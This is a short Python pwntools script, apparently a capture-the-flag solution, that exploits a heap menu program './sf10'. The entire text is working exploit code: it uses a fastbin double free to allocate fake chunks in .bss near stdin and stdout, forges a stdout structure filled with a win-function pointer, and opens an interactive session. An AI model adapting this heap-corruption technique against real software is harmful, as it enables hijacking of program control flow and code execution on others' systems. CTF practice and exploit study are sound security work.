from pwn import*
p = process('./sf10')
t = 0.05

# gadget

sys_func = 0x400946
put_got = 0x602020
bss = 0x6020c0
bss_stdout = 0x6020a0
bss_stdin = 0x6020a8
win_func = 0x400946
target = 0x602035

### defintion

def add(index,length,content):
	p.sendlineafter('2 delete \n','1');sleep(t)
	p.sendlineafter('(0-11):',str(index));sleep(t)
	p.sendlineafter('Length:',str(length));sleep(t)
	p.sendlineafter('C:',content);sleep(t)

def delete(index):
	p.sendlineafter('2 delete \n','2');sleep(t)
	p.sendlineafter('(0-11):',str(index));sleep(t)

### exploit
add(0,0x60,'a'*0x8)
add(1,0x60,'b'*0x8)
add(2,0x30,'c'*0x8)
add(3,0x30,'d'*0x8)
add(4,0x30,'e'*0x8)
delete(0)	
delete(1)
delete(0)
delete(2)
delete(3)
delete(2)
# fake stdout struct in bss
add(0,0x60,p64(bss_stdin+0x5))
add(0,0x60,'a'*0x8)
add(0,0x60,'a'*0x8)
add(0,0x60,p64(0)*2+p64(win_func)*9+p64(bss_stdin+0x5))

# fake chunk size 0x40

add(2,0x30,p64(bss_stdin-0x2e))
add(2,0x30,'c'*0x8)
add(2,0x30,'c'*0x8)
#add(2,0x30, 'X'*8)

p.interactive()
